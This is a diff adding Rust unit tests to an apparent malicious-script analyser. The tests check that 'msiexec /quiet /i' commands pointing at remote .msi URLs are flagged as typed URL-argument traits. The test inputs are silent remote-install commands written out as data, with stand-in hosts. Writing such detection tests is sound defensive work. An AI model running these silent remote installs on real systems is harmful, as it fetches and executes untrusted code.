@@ -11262,6 +11262,30 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn msiexec_attached_install_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://msiexec-attached-deob.example/setup.msi";
+        crate::deob_scan::scan_deob_text(&format!(r#"msiexec /quiet /i{url}"#), &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "msiexec attached package URL not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "msiexec attached package URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn direct_msiexec_url_package_argument_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://msiexec-direct.example/setup.msi";
@@ -11274,6 +11298,23 @@ $urlzip = "https://ps.example/stage.zip""#,
         assert!(
             has,
             "direct msiexec package URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn direct_msiexec_attached_install_url_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://msiexec-attached.example/setup.msi";
+        crate::interp::interpret_line(&format!(r#"msiexec /quiet /i{url}"#), &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "direct msiexec attached URL argument not typed: {:?}",
             env.traits
         );
     }
